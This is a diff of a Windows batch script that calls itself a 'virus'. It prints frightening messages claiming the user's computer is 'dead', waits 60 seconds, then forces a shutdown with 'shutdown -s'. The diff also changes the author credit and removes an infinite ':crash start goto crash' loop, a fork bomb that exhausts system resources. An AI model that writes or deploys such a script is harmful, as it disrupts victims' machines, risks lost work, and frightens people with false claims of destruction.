@@ -5,8 +5,5 @@ echo Your computer is legit dead now. Request backup in 60 sec. If you don't do 
 echo NOT MY PROBLEM, By the way don't restart your pc after this, you will lose everything, including your mind.
 timeout 60
 shutdown -s
-echo This is 100% real. Thanks for making this virus: L0:3E
+echo This is 100% real. Thanks for making this virus: xLowie (Lowie Eeturr)
 pause Press any key to kill your pc.
-:crash
-start
-goto crash
